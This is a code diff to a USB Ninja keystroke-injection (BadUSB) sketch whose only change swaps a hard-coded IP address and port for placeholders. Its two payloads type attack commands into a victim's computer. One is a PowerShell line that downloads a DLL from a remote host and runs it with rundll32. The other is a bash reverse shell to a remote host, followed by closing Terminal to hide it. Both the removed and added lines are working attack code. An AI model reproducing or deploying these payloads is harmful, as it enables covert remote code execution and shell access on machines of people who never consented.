@@ -27,7 +27,7 @@ void payloadA()
     NinjaKeyboard.delay(100);
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
     NinjaKeyboard.delay(500);
-    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://159.65.137.232/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
+    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://IP/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
     NinjaKeyboard.delay(100);
     NinjaKeyboard.end();
     USBninjaOffline();
@@ -48,7 +48,7 @@ void payloadB(){
     NinjaKeyboard.print(F("Terminal"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
     NinjaKeyboard.delay(1000); 
-    NinjaKeyboard.print(F("bash -i >& /dev/tcp/159.65.137.232/4443 0>&1 &"));
+    NinjaKeyboard.print(F("bash -i >& /dev/tcp/IP/POORT 0>&1 &"));
     NinjaKeyboard.sendKeyStroke(KEY_ENTER);
     NinjaKeyboard.delay(1000); 
     NinjaKeyboard.print(F("killall Terminal"));
